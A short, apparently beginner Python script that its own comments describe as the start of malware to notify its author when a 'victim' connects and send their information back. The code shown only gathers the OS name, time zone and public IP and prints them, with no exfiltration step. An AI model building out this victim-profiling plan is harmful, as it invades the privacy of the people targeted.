# I wanna  write  a  malware that notifies me  
#  when a  User (victim) connects  to it
# and sends their  information to  me  

import  platform 
import  requests
import time  
import  getpass  
from  colorama import Fore,Style,init
init(autoreset=True)

#1.
OSname =  platform.uname()[0]
print(Fore.RED+"[+]"+Fore.GREEN+OSname)

#2.
# How  can we   find  out  what  time  it is  on  their   pc  

# we  can  use the time  zone  

time_zone = time.tzname[0]
print(Fore.RED+"[+]"+Fore.GREEN+time_zone)

#3.

# when  we  serch  ((https://api.ipify.org/))
# it gives  us  our  IP  address 

ip  =  requests.get("https://api.ipify.org/").text 
print(Fore.RED+"[+]"+Fore.GREEN+ip)